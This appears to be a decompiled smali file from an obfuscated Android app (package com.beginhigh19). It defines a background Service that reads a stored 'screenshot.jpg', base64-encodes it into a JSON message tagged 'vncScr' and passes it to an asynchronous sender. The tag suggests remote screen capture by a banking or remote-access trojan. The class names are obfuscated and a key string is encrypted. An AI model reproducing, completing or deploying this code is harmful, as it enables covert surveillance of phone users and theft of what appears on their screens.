.class public Lcom/beginhigh19/p044i;
.super Landroid/app/Service;
.source "SourceFile"


# static fields
.field private static final fddo:Ljava/lang/String;

.field public static ifdf:Z


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "00fce64f32cdc1fd7d36ba334466261b91b471"

    invoke-static {v0}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/beginhigh19/p044i;->fddo:Ljava/lang/String;

    const/4 v0, 0x0

    sput-boolean v0, Lcom/beginhigh19/p044i;->ifdf:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method


# virtual methods
.method public fddo(Landroid/content/Context;)V
    .locals 6

    const-string v0, "screenshot.jpg"

    :try_start_0
    new-instance v1, Ljava/io/File;

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v2

    iget-object v2, v2, Landroid/content/pm/ApplicationInfo;->dataDir:Ljava/lang/String;

    invoke-direct {v1, v2, v0}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_0

    return-void

    :cond_0
    new-instance v2, Ljava/io/FileInputStream;

    invoke-direct {v2, v1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-virtual {v1}, Ljava/io/File;->length()J

    move-result-wide v3

    long-to-int v1, v3

    new-array v3, v1, [B

    const/4 v4, 0x0

    :goto_0
    if-ge v4, v1, :cond_1

    sub-int v5, v1, v4

    invoke-virtual {v2, v3, v4, v5}, Ljava/io/InputStream;->read([BII)I

    move-result v5

    if-ltz v5, :cond_1

    add-int/2addr v4, v5

    goto :goto_0

    :cond_1
    if-ge v4, v1, :cond_2

    return-void

    :cond_2
    invoke-virtual {v2}, Ljava/io/InputStream;->close()V

    invoke-virtual {p0, p1, v3, v0}, Lcom/beginhigh19/p044i;->ifdf(Landroid/content/Context;[BLjava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public ifdf(Landroid/content/Context;[BLjava/lang/String;)V
    .locals 3

    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    :try_start_0
    const-string v1, "xc"

    const-string v2, "vncScr"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "fn"

    invoke-virtual {v0, v1, p3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p3, "bs"

    const/4 v1, 0x0

    invoke-static {p2, v1}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v0, p3, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    new-instance p2, Lfddo/this;

    invoke-direct {p2, p1, v0}, Lfddo/this;-><init>(Landroid/content/Context;Lorg/json/JSONObject;)V

    sget-object p1, Landroid/os/AsyncTask;->THREAD_POOL_EXECUTOR:Ljava/util/concurrent/Executor;

    new-array p3, v1, [Ljava/lang/Void;

    invoke-virtual {p2, p1, p3}, Landroid/os/AsyncTask;->executeOnExecutor(Ljava/util/concurrent/Executor;[Ljava/lang/Object;)Landroid/os/AsyncTask;

    :catch_0
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onDestroy()V
    .locals 1

    const/4 v0, 0x0

    sput-boolean v0, Lcom/beginhigh19/p044i;->ifdf:Z

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    const/4 p2, 0x2

    if-nez p1, :cond_0

    return p2

    :cond_0
    sget-boolean p1, Lcom/beginhigh19/p067x;->this:Z

    if-nez p1, :cond_1

    return p2

    :cond_1
    sget-boolean p1, Lcom/beginhigh19/p044i;->ifdf:Z

    if-eqz p1, :cond_2

    return p2

    :cond_2
    const/4 p1, 0x1

    sput-boolean p1, Lcom/beginhigh19/p044i;->ifdf:Z

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    invoke-static {p2, p0}, Lcom/beginhigh19/p041i;->fddo(Landroid/content/Context;Landroid/app/Service;)V

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    invoke-static {p2}, Lcom/beginhigh19/p041i;->for(Landroid/content/Context;)V

    new-instance p2, Ljava/lang/Thread;

    new-instance p3, Lcom/beginhigh19/p044i$fddo;

    invoke-direct {p3, p0}, Lcom/beginhigh19/p044i$fddo;-><init>(Lcom/beginhigh19/p044i;)V

    invoke-direct {p2, p3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {p2}, Ljava/lang/Thread;->start()V

    return p1
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 1

    const/4 v0, 0x0

    sput-boolean v0, Lcom/beginhigh19/p044i;->ifdf:Z

    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    return-void
.end method
